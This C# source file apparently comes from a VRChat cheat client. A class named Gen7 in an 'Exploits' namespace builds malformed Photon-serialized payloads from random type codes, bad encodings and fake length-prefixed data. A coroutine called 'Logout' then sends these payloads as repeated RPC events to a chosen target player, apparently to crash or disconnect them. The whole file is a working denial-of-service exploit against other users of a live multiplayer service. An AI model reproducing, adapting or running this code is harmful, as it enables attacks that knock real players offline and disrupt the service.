using ExitGames.Client.Photon;
using System;
using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using VRCSDK2;

#if STEAM
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#elif OCULUS
using PhotonNetwork = DKGBGACHCGF;
using PhotonPlayer = MAAMBGJCOKM;
#endif

using Random = System.Random;

namespace Exploits
{
    public class Gen7
    {
        private class Gen7Internal : MonoBehaviour
        {
            public Gen7Internal()
            {
                DontDestroyOnLoad(this);
            }

            private static byte[] GetEncodedErroneous()
            {
                byte[] result;

                StreamBuffer streamBuffer = new StreamBuffer(0);
                //using (StreamBuffer streamBuffer = new StreamBuffer(0))
                {
                    Random random = RpcSecureWrap.Random;

                    int i = 0;

                    while (i < 2800)
                    {
                        int num = random.Next(0, 100);

                        byte b = (byte)((num % 4 == 0) ? 101 : ((num % 3 == 0) ? 68 : ((num % 2 == 0) ? 104 : 122)));

                        streamBuffer.WriteByte(b);

                        short serObject = (short)random.Next(8, 32767);
                        byte value = 0;

                        if (b != 68)
                        {
                            if (b != 101)
                            {
                                Protocol.ProtocolDefault.SerializeShort(streamBuffer, serObject, false);
                            }
                            else
                            {
                                streamBuffer.WriteByte(200);
                                Protocol.ProtocolDefault.SerializeShort(streamBuffer, serObject, false);
                                streamBuffer.WriteByte(value = (byte)random.Next(0, 255));
                            }
                        }
                        else
                        {
                            streamBuffer.Write(new byte[2], 0, 2);
                            Protocol.ProtocolDefault.SerializeShort(streamBuffer, serObject, false);
                        }

                        i++;
                        num = random.Next(-50, random.Next(3, 5));

                        if (num > 0)
                        {
                            object[] array = new object[100];

                            for (int j = 0; j < array.Length; j++)
                            {
                                object obj = null;
                                if (random.Next(0, 100) % 2 == 0)
                                {
                                    switch (random.Next(0, 4))
                                    {
                                        case 0:
                                            obj = new Vector2((float)random.Next(0, 1000), (float)random.Next(0, 1000));
                                            break;

                                        case 1:
                                            obj = new Vector3((float)random.Next(0, 1000), (float)random.Next(0, 1000), (float)random.Next(0, 1000));
                                            break;

                                        case 2:
                                            obj = new Vector4((float)random.Next(0, 1000), (float)random.Next(0, 1000), (float)random.Next(0, 1000), (float)random.Next(0, 1000));
                                            break;

                                        case 3:
                                            obj = new byte[random.Next(2, 5)];
                                            break;

                                        case 4:
                                            obj = new Quaternion((float)random.Next(0, 1000), (float)random.Next(0, 1000), (float)random.Next(0, 1000), (float)random.Next(0, 1000));
                                            break;
                                    }
                                }
                                else
                                {
                                    switch (random.Next(0, 4))
                                    {
                                        case 0:
                                            obj = (byte)random.Next(0, 255);
                                            break;

                                        case 1:
                                            obj = (short)random.Next(-32768, 32767);
                                            break;

                                        case 2:
                                            obj = random.Next(int.MinValue, int.MaxValue);
                                            break;

                                        case 3:
                                            obj = UnityEngine.Random.Range(float.MinValue, float.MaxValue);
                                            break;

                                        case 4:
                                            obj = (long)UnityEngine.Random.Range(-9.223372E+18f, 9.223372E+18f);
                                            break;
                                    }
                                }

                                array[j] = obj;
                            }
                            if (b == 101)
                            {
                                for (int k = 0; k < num; k++)
                                {
                                    Protocol.ProtocolDefault.Serialize(streamBuffer, array[random.Next(0, array.Length - 1)], true);
                                    streamBuffer.WriteByte(value);
                                }
                            }
                            else
                            {
                                for (int l = 0; l < num; l++)
                                {
                                    Protocol.ProtocolDefault.Serialize(streamBuffer, array[random.Next(0, array.Length - 1)], true);
                                }
                            }
                        }
                    }

                    result = streamBuffer.ToArray();
                }

                return result;
            }

            private static short RandomShort(Random r)
            {
                return (short)r.Next(16384, 32767);
            }
            private static byte[] ToBytes(short s)
            {
                return new byte[]
                {
                    (byte)(s >> 8),
                    (byte)(s & 255)
                };
            }

            private static byte[] Generate(Random r)
            {
                List<byte> data = new List<byte>();

                int num = r.Next(4000, 5000);

                byte[] array = new byte[5000];

                int num2 = 0;

                for (int i = 0; i < num; i++)
                {
                    int num3 = r.Next(0, (i == 0) ? 15 : 18);
                    if (num2 != 0 && array[num2 - 1] == 1)
                    {
                        data.Add(240);
                    }
                    switch (num3)
                    {
                        case 0:
                        case 1:
                        case 2:
                        case 3:
                        case 4:
                            array[num2++] = 0;
                            data.Add(122);
                            data.AddRange(ToBytes(RandomShort(r)));
                            break;
                        case 5:
                        case 6:
                        case 7:
                        case 8:
                        case 9:
                            array[num2++] = 1;
                            data.Add(101);
                            data.Add(200);
                            data.AddRange(ToBytes(RandomShort(r)));
                            break;
                        case 10:
                        case 11:
                        case 12:
                        case 13:
                        case 14:
                            array[num2++] = 2;
                            data.Add(104);
                            data.AddRange(ToBytes(RandomShort(r)));
                            break;
                        case 15:
                            {
                                data.Add(99);
                                data.Add(86);
                                data.AddRange(ToBytes(12));
                                byte[] array2 = new byte[12];
                                r.NextBytes(array2);
                                data.AddRange(array2);
                                break;
                            }
                        case 16:
                            {
                                data.Add(99);
                                data.Add(87);
                                data.AddRange(ToBytes(8));
                                byte[] array3 = new byte[8];
                                r.NextBytes(array3);
                                data.AddRange(array3);
                                break;
                            }
                        case 17:
                            {
                                data.Add(99);
                                data.Add(101);
                                data.AddRange(ToBytes(16));
                                byte[] array4 = new byte[16];
                                r.NextBytes(array4);
                                data.AddRange(array4);
                                break;
                            }
                    }
                }
                return data.ToArray();
            }

            internal static byte[] Filler(Random r)
            {
                byte[] array = new byte[r.Next(1116, 2423)];
                for (int i = 0; i < array.Length; i++)
                {
                    array[i] = (byte)r.Next(0, 42);
                }
                return array;
            }

            internal static byte[] FakeData(Random r)
            {
                byte[] array = new byte[r.Next(7832, 14263)];
                int num = 0;
                array[num++] = 122;
                Protocol.Serialize(1, array, ref num);
                array[num++] = 120;
                Protocol.Serialize(array.Length - (num + 4), array, ref num);
                for (int i = num; i < array.Length; i++)
                {
                    array[i] = (byte)r.Next(0, 77);
                }
                return array;
            }

            private PhotonPlayer Target;

            
            private IEnumerator Logout()
            {
                //byte[] generated = Generate(RpcSecureWrap.Random);
                byte[] generated = GetEncodedErroneous();

                Random rnd = RpcSecureWrap.Random;

                int rnd1 = rnd.Next(12, 17);
                int rnd2 = rnd.Next(7, rnd1 - 3);

                for (int i = 0; i < rnd1; i++)
                {
                    VRC_EventHandler.VrcEvent ev = new VRC_EventHandler.VrcEvent
                    {
                        EventType = VRC_EventHandler.VrcEventType.SendRPC,
                        ParameterObject = null,
                        ParameterString = RpcSecureWrap.GetRandomRpc(),
                        ParameterBytes = ((i == rnd2) ? generated : ((RpcSecureWrap.Random.Next(0, 10) < 5) ? Filler(RpcSecureWrap.Random) : FakeData(RpcSecureWrap.Random))),
                        ParameterBytesVersion = 1,
                        ParameterInt = 9
                    };

                    RpcSecureWrap.SendRpcSecure(Target, ev);
                    yield return new WaitForSeconds(0.05f);
                    RpcSecureWrap.SendRpcSecure(Target, ev);
                    yield return new WaitForSeconds(0.05f);
                    RpcSecureWrap.SendRpcSecure(Target, ev);
                    yield return new WaitForSeconds(0.05f);
                    RpcSecureWrap.SendRpcSecure(Target, ev);
                    yield return new WaitForSeconds(0.05f);
                    RpcSecureWrap.SendRpcSecure(Target, ev);
                }

                yield return new WaitForEndOfFrame();
            }

            public void SetTarget(PhotonPlayer target)
            {
                Target = target;
            }

            public void Trigger()
            {
                StartCoroutine(Logout());
            }
        }

        private Gen7Internal gen7;

        public Gen7(object target)
        {
            GameObject targetObject = new GameObject();
            gen7 = targetObject.AddComponent<Gen7Internal>();
            UnityEngine.Object.DontDestroyOnLoad(targetObject);

            gen7.SetTarget((PhotonPlayer)target);
        }

        public void Trigger()
        {
            gen7.Trigger();
        }
    }
}